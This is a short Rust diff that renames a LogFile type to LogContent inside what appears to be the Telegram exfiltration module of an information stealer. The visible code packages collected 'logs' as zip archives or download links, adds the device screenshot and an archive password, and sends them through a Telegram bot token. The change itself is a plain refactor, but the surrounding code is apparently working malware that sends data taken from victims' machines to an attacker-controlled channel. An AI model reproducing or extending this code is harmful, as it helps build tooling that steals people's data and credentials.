@@ -1,4 +1,4 @@
-use crate::{LogFile, LogSender, SendError};
+use crate::{LogContent, LogSender, SendError};
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -16,7 +16,7 @@ pub struct TelegramBot {
     token: Arc<str>
 }
 
-fn generate_caption<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> (String, Option<String>)
+fn generate_caption<P, C>(log: &LogContent, password: Option<P>, collector: &C) -> (String, Option<String>)
 where
     P: AsRef<str>,
     C: Collector
@@ -24,14 +24,14 @@ where
     let caption = DisplayCollector(collector).to_string();
 
     let link = match log {
-        LogFile::ExternalLink((link, size)) => Some(
+        LogContent::ExternalLink((link, size)) => Some(
             format!(
                 r#"<a href="{}">Download [{}]</a>"#,
                 link,
                 format_size(*size as _)
             )
         ),
-        LogFile::ZipArchive(_) => None
+        LogContent::ZipArchive(_) => None
     };
 
     let password = password.map(|password| {
@@ -187,7 +187,7 @@ fn combine_caption_and_thumbnail(caption: &str, thumbnail: Option<String>) -> St
 }
 
 impl LogSender for TelegramBot {
-    fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+    fn send<P, C>(&self, log_file: LogContent, password: Option<P>, collector: &C) -> Result<(), SendError>
     where
         P: AsRef<str> + Clone,
         C: Collector
@@ -195,13 +195,13 @@ impl LogSender for TelegramBot {
         let (caption, thumbnail) = generate_caption(&log_file, password, collector);
 
         match log_file {
-            LogFile::ZipArchive(archive) => self.send_as_file(
+            LogContent::ZipArchive(archive) => self.send_as_file(
                 archive,
                 collector.get_device().get_screenshot(),
                 caption,
                 thumbnail
             ),
-            LogFile::ExternalLink(_) => self.send_as_link(
+            LogContent::ExternalLink(_) => self.send_as_link(
                 collector.get_device().get_screenshot(),
                 caption,
                 thumbnail
